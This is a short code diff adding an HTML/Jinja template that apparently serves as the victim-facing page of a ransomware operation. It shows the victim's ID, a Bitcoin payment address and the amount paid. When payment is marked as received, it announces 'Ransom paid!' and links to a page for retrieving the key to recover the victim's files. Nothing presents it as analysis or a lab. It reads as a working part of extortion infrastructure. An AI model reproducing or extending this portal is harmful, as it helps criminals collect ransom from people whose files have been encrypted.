@@ -1,0 +1,20 @@
+<!-- extend base layout -->
+{% extends "base.html" %}
+
+{% block content %}
+{% if uid %}
+    <h1>Your information</h1>
+	<b>User ID:</b> {{ uid }}<br>
+    <b>Payment Address:</b> {{ btcaddr }}<br>
+    <b>Balance paid:</b> {{balance}} BTC<br>
+    <b>To check if your payment has been received:</b> <a href="{{myurl}}/user/{{uid}}">{{myurl}}/user/{{uid}}</a><br>
+    {% if paid %}
+        <h1>Ransom paid!</h1>
+        Please visit <a href="{{myurl}}/key/{{uid}}">{{myurl}}/key/{{uid}}</a> to get the key to recover your files!
+    {% else %}
+        If you have already sent your payment, refresh this page every few minutes, your payment is being processed.
+    {% endif %}
+{% else %}
+	<h1>Please log in, brother</h1>
+{% endif %}
+{% endblock %}
